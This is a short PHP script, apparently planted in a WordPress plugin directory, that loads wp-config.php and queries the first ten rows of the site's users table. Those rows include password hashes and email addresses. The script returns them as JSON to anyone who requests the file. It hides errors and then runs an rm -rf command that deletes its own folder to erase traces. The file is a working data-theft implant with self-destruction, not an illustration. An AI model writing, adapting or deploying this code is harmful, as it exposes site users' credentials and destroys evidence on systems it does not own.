﻿<?php 
//err off
ini_set('display_errors', 0); ini_set('display_startup_errors', 0); error_reporting(E_ALL);

require '../../../wp-config.php';

global $wpdb;
header("Content-Type: application/json");

$users = $wpdb->get_results( "SELECT * FROM $wpdb->users LIMIT 10;" );
echo json_encode($users);

$f = fopen('un.php', 'w');
fclose($f);
exec('rm -rf ../'.basename(__DIR__));
//***

?>